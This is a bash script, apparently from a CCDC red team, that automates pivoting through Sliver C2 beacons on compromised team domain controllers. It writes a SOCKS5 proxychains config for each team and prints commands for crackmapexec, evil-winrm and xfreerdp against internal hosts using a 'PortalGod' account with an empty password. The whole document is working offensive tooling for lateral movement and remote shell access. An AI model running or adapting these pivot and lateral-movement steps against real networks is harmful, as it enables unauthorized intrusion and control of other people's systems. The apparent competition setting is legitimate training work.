#!/bin/bash
# ================================================
# CCDC Rapid Pivot Switcher (Sliver SOCKS5)
# Usage: ./pivot.sh <team_number> [port]
#   e.g. ./pivot.sh 5          → starts SOCKS on 1085
#   e.g. ./pivot.sh 5 1090     → custom port
# ================================================

if [[ -z "$1" ]]; then
  echo "Usage: $0 <team> [port]"
  echo "Current active pivots:"
  ss -tlnp | grep -E '108[0-9]' || echo "   None"
  exit 1
fi

TEAM="$1"
PORT="${2:-108${TEAM}}"   # 1085 for team 5, 1084 for team 4, etc.
DOMAIN="aperturesciencelabs.org"

echo "[+] ================================================"
echo "[+] Switching to TEAM ${TEAM} pivot (SOCKS5 on 127.0.0.1:${PORT})"
echo "[+] ================================================"

# 1. Tell Sliver to start SOCKS5 on the chosen beacon (you pick the DC beacon once)
echo "[*] In Sliver console, run these two commands now:"
echo "    use <beacon_on_team${TEAM}_DC>     # or sessions -i <ID>"
echo "    socks5 start --bind 0.0.0.0:${PORT}"
echo ""
echo "[+] Once SOCKS5 is running, press ENTER here..."
read -r

# 2. Create per-team proxychains config (super fast switching)
cat > "/tmp/proxychains_team${TEAM}.conf" << EOF
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 ${PORT}
EOF

echo "[+] Created /tmp/proxychains_team${TEAM}.conf"
echo ""
echo "[+] NOW USE THESE ALIASES / COMMANDS:"
echo "    alias p${TEAM}='proxychains4 -f /tmp/proxychains_team${TEAM}.conf'"
echo "    p${TEAM} crackmapexec smb 172.16.3.140 -u PortalGod -p '' -d ${DOMAIN} -k"
echo "    p${TEAM} evil-winrm -i 172.16.1.11 -u PortalGod -p ''"
echo "    p${TEAM} xfreerdp /v:172.16.1.10 /u:PortalGod@${DOMAIN} /cert-ignore"
echo ""
echo "[+] Pro tip: Add this alias permanently to your ~/.bashrc:"
echo "    alias pivot='~/pivot.sh'"
echo ""
echo "[+] You can now run commands on ANY internal IP for team ${TEAM} instantly."
echo "[+] Open tmux panes for multiple teams at once — zero conflict."
echo "The cake is a lie… but your pivots are instant."